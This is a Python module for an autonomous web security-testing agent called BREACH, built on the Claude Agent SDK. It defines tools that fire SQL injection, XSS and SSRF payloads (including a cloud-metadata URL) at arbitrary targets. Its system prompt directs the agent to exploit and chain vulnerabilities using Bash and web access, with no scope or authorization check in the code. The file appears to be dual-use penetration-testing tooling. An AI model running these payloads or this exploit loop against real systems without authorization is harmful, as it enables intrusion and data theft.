"""
BREACH v3.1 - Claude Agent SDK Integration
===========================================

Uses the official Claude Agent SDK (same one powering Claude Code).

This replaces raw API calls with the proper agent harness that provides:
- Multi-turn autonomous execution
- Built-in tools (Bash, Read, Write, WebFetch)
- Custom security testing tools via MCP
- Checkpointing and session management
- Streaming responses
"""

import asyncio
import json
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from enum import Enum

try:
    from claude_agent_sdk import (
        query,
        ClaudeAgentOptions,
        ClaudeSDKClient,
        AssistantMessage,
        TextBlock,
        ToolUseBlock,
        ToolResultBlock,
        tool,
        create_sdk_mcp_server,
    )
    AGENT_SDK_AVAILABLE = True
except ImportError:
    AGENT_SDK_AVAILABLE = False

# Fallback to raw anthropic if SDK not available
try:
    import anthropic
    ANTHROPIC_AVAILABLE = True
except ImportError:
    ANTHROPIC_AVAILABLE = False


class AgentState(str, Enum):
    """Agent execution state."""
    IDLE = "idle"
    RUNNING = "running"
    WAITING_TOOL = "waiting_tool"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class AgentTurn:
    """Single turn in agent conversation."""
    turn_number: int
    role: str
    content: str
    tool_calls: List[Dict] = field(default_factory=list)
    tool_results: List[Dict] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.utcnow)
    tokens_used: int = 0


@dataclass
class AgentResult:
    """Result of agent execution."""
    success: bool
    output: str
    structured_output: Dict = field(default_factory=dict)
    turns_used: int = 0
    total_tokens: int = 0
    cost_usd: float = 0.0
    duration_seconds: float = 0.0
    conversation: List[AgentTurn] = field(default_factory=list)
    error: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)


# =============================================================================
# CUSTOM SECURITY TESTING TOOLS (MCP Server)
# =============================================================================

if AGENT_SDK_AVAILABLE:

    @tool(
        "http_request",
        "Make an HTTP request to test for vulnerabilities. Returns response status, headers, and body.",
        {"url": str, "method": str, "headers": dict, "body": str, "timeout": int}
    )
    async def http_request_tool(args: Dict) -> Dict:
        """Make HTTP request for security testing."""
        import aiohttp

        url = args.get("url", "")
        method = args.get("method", "GET").upper()
        headers = args.get("headers", {})
        body = args.get("body")
        timeout = args.get("timeout", 30)

        try:
            async with aiohttp.ClientSession() as session:
                kwargs = {
                    "url": url,
                    "headers": headers,
                    "timeout": aiohttp.ClientTimeout(total=timeout),
                    "ssl": False,  # Allow self-signed certs
                }

                if body and method in ("POST", "PUT", "PATCH"):
                    kwargs["data"] = body

                async with session.request(method, **kwargs) as resp:
                    response_body = await resp.text()

                    return {
                        "content": [{
                            "type": "text",
                            "text": json.dumps({
                                "status": resp.status,
                                "headers": dict(resp.headers),
                                "body": response_body[:10000],  # Limit response size
                                "url": str(resp.url),
                            }, indent=2)
                        }]
                    }

        except Exception as e:
            return {
                "content": [{
                    "type": "text",
                    "text": f"HTTP request failed: {str(e)}"
                }]
            }

    @tool(
        "sql_injection_test",
        "Test a URL parameter for SQL injection vulnerabilities",
        {"url": str, "param": str, "method": str}
    )
    async def sqli_test_tool(args: Dict) -> Dict:
        """Test for SQL injection."""
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        url = args.get("url", "")
        param = args.get("param", "")
        method = args.get("method", "GET").upper()

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' AND '1'='1",
            "1 AND 1=1",
            "1' AND SLEEP(5)--",
            "1; SELECT * FROM users--",
        ]

        results = []
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        try:
            async with aiohttp.ClientSession() as session:
                # Baseline request
                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    baseline_status = resp.status
                    baseline_length = len(await resp.text())

                for payload in payloads:
                    test_qs = qs.copy()
                    test_qs[param] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))

                    start = time.time()
                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        elapsed = time.time() - start
                        body = await resp.text()

                        indicators = []
                        if resp.status != baseline_status:
                            indicators.append(f"Status changed: {baseline_status} -> {resp.status}")
                        if abs(len(body) - baseline_length) > 100:
                            indicators.append(f"Length changed: {baseline_length} -> {len(body)}")
                        if elapsed > 4.5:
                            indicators.append(f"Time-based: {elapsed:.1f}s delay")
                        if any(err in body.lower() for err in ["sql", "mysql", "syntax", "query"]):
                            indicators.append("SQL error in response")

                        if indicators:
                            results.append({
                                "payload": payload,
                                "indicators": indicators,
                                "status": resp.status,
                                "response_length": len(body),
                                "time": elapsed,
                            })

                return {
                    "content": [{
                        "type": "text",
                        "text": json.dumps({
                            "url": url,
                            "param": param,
                            "baseline_status": baseline_status,
                            "baseline_length": baseline_length,
                            "findings": results,
                            "vulnerable": len(results) > 0,
                        }, indent=2)
                    }]
                }

        except Exception as e:
            return {
                "content": [{
                    "type": "text",
                    "text": f"SQLi test failed: {str(e)}"
                }]
            }

    @tool(
        "xss_test",
        "Test a URL parameter for XSS vulnerabilities",
        {"url": str, "param": str}
    )
    async def xss_test_tool(args: Dict) -> Dict:
        """Test for XSS."""
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import uuid

        url = args.get("url", "")
        param = args.get("param", "")

        canary = f"BREACH{uuid.uuid4().hex[:8]}"
        payloads = [
            f"<script>alert('{canary}')</script>",
            f"<img src=x onerror=alert('{canary}')>",
            f"<svg onload=alert('{canary}')>",
            f"javascript:alert('{canary}')",
            f"'\"><script>alert('{canary}')</script>",
        ]

        results = []
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    test_qs = qs.copy()
                    test_qs[param] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))

                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()

                        # Check if payload is reflected
                        reflected = payload in body or canary in body

                        if reflected:
                            results.append({
                                "payload": payload,
                                "reflected": True,
                                "context": "Check if script executes in browser",
                            })

                return {
                    "content": [{
                        "type": "text",
                        "text": json.dumps({
                            "url": url,
                            "param": param,
                            "findings": results,
                            "potentially_vulnerable": len(results) > 0,
                            "note": "Reflected payloads need browser validation for confirmed XSS",
                        }, indent=2)
                    }]
                }

        except Exception as e:
            return {
                "content": [{
                    "type": "text",
                    "text": f"XSS test failed: {str(e)}"
                }]
            }

    @tool(
        "ssrf_test",
        "Test a URL parameter for SSRF vulnerabilities",
        {"url": str, "param": str}
    )
    async def ssrf_test_tool(args: Dict) -> Dict:
        """Test for SSRF."""
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        url = args.get("url", "")
        param = args.get("param", "")

        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
        ]

        results = []
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        try:
            async with aiohttp.ClientSession() as session:
                # Baseline
                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    baseline = await resp.text()

                for payload in payloads:
                    test_qs = qs.copy()
                    test_qs[param] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))

                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()

                        indicators = []
                        if "127.0.0.1" in body or "localhost" in body:
                            indicators.append("Internal address in response")
                        if "metadata" in body.lower() or "ami-id" in body:
                            indicators.append("AWS metadata exposed!")
                        if body != baseline and len(body) > len(baseline) + 50:
                            indicators.append("Response differs from baseline")

                        if indicators:
                            results.append({
                                "payload": payload,
                                "indicators": indicators,
                            })

                return {
                    "content": [{
                        "type": "text",
                        "text": json.dumps({
                            "url": url,
                            "param": param,
                            "findings": results,
                            "vulnerable": len(results) > 0,
                        }, indent=2)
                    }]
                }

        except Exception as e:
            return {
                "content": [{
                    "type": "text",
                    "text": f"SSRF test failed: {str(e)}"
                }]
            }


def create_security_tools_server():
    """Create MCP server with security testing tools."""
    if not AGENT_SDK_AVAILABLE:
        return None

    return create_sdk_mcp_server(
        name="breach-security-tools",
        version="3.0.0",
        tools=[
            http_request_tool,
            sqli_test_tool,
            xss_test_tool,
            ssrf_test_tool,
        ]
    )


# =============================================================================
# BREACH AGENT (Claude Agent SDK)
# =============================================================================

class BreachAgent:
    """
    BREACH Security Agent using Claude Agent SDK.

    This is the main agent class that wraps the Claude Agent SDK
    for autonomous security testing.
    """

    def __init__(
        self,
        system_prompt: str = None,
        max_turns: int = 50,
        working_dir: Path = None,
        on_message: Callable[[str], None] = None,
        on_tool_use: Callable[[str, Dict], None] = None,
    ):
        if not AGENT_SDK_AVAILABLE:
            raise ImportError(
                "Claude Agent SDK required. Install: pip install claude-agent-sdk"
            )

        self.system_prompt = system_prompt or self._default_system_prompt()
        self.max_turns = max_turns
        self.working_dir = working_dir or Path.cwd()
        self.on_message = on_message
        self.on_tool_use = on_tool_use

        self._state = AgentState.IDLE
        self._turns: List[AgentTurn] = []

    def _default_system_prompt(self) -> str:
        return """You are BREACH, an autonomous security testing agent.

Your mission: Find and EXPLOIT vulnerabilities with PROOF.

Rules:
1. NO EXPLOIT = NO REPORT. Only report vulnerabilities you can prove.
2. Use the security testing tools to verify findings.
3. Chain vulnerabilities when possible.
4. Provide curl commands as proof.
5. Be thorough but efficient.

Available tools:
- http_request: Make HTTP requests to test endpoints
- sql_injection_test: Test parameters for SQLi
- xss_test: Test parameters for XSS reflection
- ssrf_test: Test parameters for SSRF
- Bash: Run shell commands
- Read: Read files
- WebFetch: Fetch web pages

When you find a vulnerability:
1. Verify it's exploitable
2. Document the exact steps
3. Provide a curl command as proof
4. Assess the impact
"""

    async def run(
        self,
        task: str,
        context: Dict = None,
    ) -> AgentResult:
        """
        Run the agent on a security testing task.

        Args:
            task: The security testing task
            context: Additional context (target info, recon results, etc.)

        Returns:
            AgentResult with findings and proof
        """
        start_time = time.time()
        self._state = AgentState.RUNNING
        self._turns = []

        # Build prompt
        prompt = self._build_prompt(task, context)

        # Create security tools MCP server
        security_server = create_security_tools_server()

        # Configure agent options
        options = ClaudeAgentOptions(
            system_prompt=self.system_prompt,
            max_turns=self.max_turns,
            cwd=str(self.working_dir),
            allowed_tools=[
                "Bash",
                "Read",
                "WebFetch",
                "mcp__breach-security-tools__http_request",
                "mcp__breach-security-tools__sql_injection_test",
                "mcp__breach-security-tools__xss_test",
                "mcp__breach-security-tools__ssrf_test",
            ],
            mcp_servers={"breach-security-tools": security_server} if security_server else {},
            permission_mode="acceptEdits",
        )

        output_text = ""
        findings = []
        turn_count = 0

        try:
            async for message in query(prompt=prompt, options=options):
                if isinstance(message, AssistantMessage):
                    for block in message.content:
                        if isinstance(block, TextBlock):
                            output_text += block.text + "\n"
                            if self.on_message:
                                self.on_message(block.text)

                        elif isinstance(block, ToolUseBlock):
                            turn_count += 1
                            if self.on_tool_use:
                                self.on_tool_use(block.name, block.input)

                            self._turns.append(AgentTurn(
                                turn_number=turn_count,
                                role="tool",
                                content=f"Tool: {block.name}",
                                tool_calls=[{"name": block.name, "input": block.input}],
                            ))

            self._state = AgentState.COMPLETED

            # Extract findings from output
            findings = self._extract_findings(output_text)

            return AgentResult(
                success=True,
                output=output_text,
                structured_output={"findings": findings},
                turns_used=turn_count,
                duration_seconds=time.time() - start_time,
                conversation=self._turns,
                findings=findings,
            )

        except Exception as e:
            self._state = AgentState.FAILED

            return AgentResult(
                success=False,
                output=output_text,
                error=str(e),
                turns_used=turn_count,
                duration_seconds=time.time() - start_time,
                conversation=self._turns,
            )

    def _build_prompt(self, task: str, context: Dict = None) -> str:
        """Build the task prompt."""
        prompt = f"# Security Testing Task\n\n{task}\n"

        if context:
            prompt += "\n# Context\n\n"
            if "target" in context:
                prompt += f"Target: {context['target']}\n"
            if "endpoints" in context:
                prompt += f"\nEndpoints to test:\n"
                for ep in context["endpoints"][:20]:  # Limit
                    prompt += f"- {ep}\n"
            if "parameters" in context:
                prompt += f"\nParameters found:\n"
                for param in list(context["parameters"])[:30]:
                    prompt += f"- {param}\n"

        prompt += """
# Instructions

1. Analyze the target and identify potential vulnerabilities
2. Use the security testing tools to verify each finding
3. Only report vulnerabilities with working exploits
4. Provide curl commands as proof for each finding
5. Summarize findings at the end in JSON format:

```json
{
  "findings": [
    {
      "type": "sqli|xss|ssrf|etc",
      "endpoint": "URL",
      "parameter": "param name",
      "payload": "the working payload",
      "proof": "curl command",
      "severity": "CRITICAL|HIGH|MEDIUM|LOW"
    }
  ]
}
```
"""
        return prompt

    def _extract_findings(self, output: str) -> List[Dict]:
        """Extract structured findings from output."""
        import re

        findings = []

        # Look for JSON block
        json_match = re.search(r'```json\s*([\s\S]*?)\s*```', output)
        if json_match:
            try:
                data = json.loads(json_match.group(1))
                if "findings" in data:
                    findings = data["findings"]
            except:
                pass

        return findings


# =============================================================================
# BACKWARD COMPATIBILITY - ClaudeAgent wrapper
# =============================================================================

class ClaudeAgent(BreachAgent):
    """Backward compatible alias for BreachAgent."""
    pass


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    "BreachAgent",
    "ClaudeAgent",
    "AgentResult",
    "AgentTurn",
    "AgentState",
    "create_security_tools_server",
    "AGENT_SDK_AVAILABLE",
]
